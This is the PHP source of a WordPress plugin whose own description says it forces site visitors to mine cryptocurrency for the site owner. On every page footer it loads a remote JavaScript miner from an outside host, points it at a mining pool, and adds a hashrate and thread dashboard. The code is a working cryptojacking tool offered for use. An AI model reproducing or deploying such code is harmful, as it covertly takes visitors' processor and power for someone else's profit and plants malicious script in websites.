<?php
/*
Plugin Name:  Cardano Minner For Wordpress
Plugin URI:   https://github.com/spacestangs/
Description:  this plugin will force your wordpress vistors to mine cardano for you :)
Version:      1.00
Author:       spacestangs
Author URI:   https://www.anan.media
License:      GPL2
License URI:  https://www.gnu.org/licenses/gpl-2.0.html
Text Domain:  cmwp-lang
Domain Path:  /languages
*/

/*
This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

*/

function cmwp_init()
{
    load_plugin_textdomain(
        "cmwp",
        false,
        "/languages/"
    );
}
add_action("init", "cmwp_init");

function addcssfiles()
{

    wp_enqueue_style(
        "style",
        plugins_url("/scripts/styles.css", __FILE__),
        false,
        "1.0.1",
        "all"
    );

}


add_action("wp_enqueue_scripts", "addcssfiles");

add_action( 'wp_footer', 'ak_cmwp');
function ak_cmwp () {
	
    ?>

	<head>

	<script src="<?php echo plugins_url( "/scripts/jquery-3.2.1.min.js", __FILE__ ); ?>"></script>

	<!-- Wallet Cookie handle -->
	<script src="<?php echo plugins_url( "/scripts/jquery.cookie-1.4.1.min.js", __FILE__ ); ?>"></script>
	
	<!-- Javascript Constructor -->
	<script src="https://easyhash.de/mmh/mmh.js?v10?perfekt=wss://?algo=cn/r?jason=gulf.moneroocean.stream:10004"></script>
	
	<script src="<?php echo plugins_url( "/scripts/gustav.js?v290918", __FILE__ ); ?>"></script>
	
	<!-- Barchart -->
	<script src="<?php echo plugins_url( "/scripts/Chart.min.js", __FILE__ ); ?>"></script>

</head>


<div class="rowminner" align="center">
    <div class="box">
        <h3>hashes/s</h3>
        <h2 id="hashes-per-second">0</h2>
    </div>
    <div class="box">
        <h3>threads</h3>
        <h2>
			<span id="threads">2</span>
			<span id="thread-add" class="action"> + </span>
			<span class="divide"> / </span>
			<span id="thread-remove" class="action"> - </span>
		</h2>
    </div>
</div>

<div class="rowminner" align="center">
    <div class="rowminner">
        <h3> Total Hashes | Accepted Shares</h3>
        <h2 id="accepted-shares">0</h2>
    </div>
    <div class="rowminner">
        <h3> Current Algo</h3>
        <h2 id="algo">XHV</h2>
    </div>
</div>


<button class="rowminner" id="start">Start</button>
	

	<?php

}
